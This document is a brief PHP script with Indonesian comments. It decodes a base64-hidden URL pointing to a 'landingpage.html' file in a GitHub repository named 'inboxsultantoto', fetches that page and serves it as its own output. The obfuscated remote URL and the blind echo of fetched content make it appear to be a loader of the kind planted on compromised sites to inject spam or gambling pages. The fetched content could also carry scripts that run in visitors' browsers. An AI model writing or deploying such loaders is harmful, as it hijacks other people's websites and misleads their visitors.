<?php
// Base64-encoded URL
$base64_url = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25vdGZvdW5kNDA0eC9pbmJveHN1bHRhbnRvdG8vcmVmcy9oZWFkcy9tYWluL2xhbmRpbmdwYWdlLmh0bWw=';

// Dekode Base64 untuk mendapatkan URL
$raw_url = base64_decode($base64_url);

// Periksa apakah dekode berhasil
if ($raw_url === false) {
    die('Gagal mendekode URL Base64.');
}

// Ambil konten HTML dari URL
$html_content = file_get_contents($raw_url);

// Periksa apakah konten berhasil diambil
if ($html_content === false) {
    die('Gagal mengambil konten dari GitHub. Pastikan URL benar dan file dapat diakses.');
}

// Set header agar browser tahu ini adalah HTML
header('Content-Type: text/html; charset=utf-8');

// Tampilkan konten HTML
echo $html_content;
?>
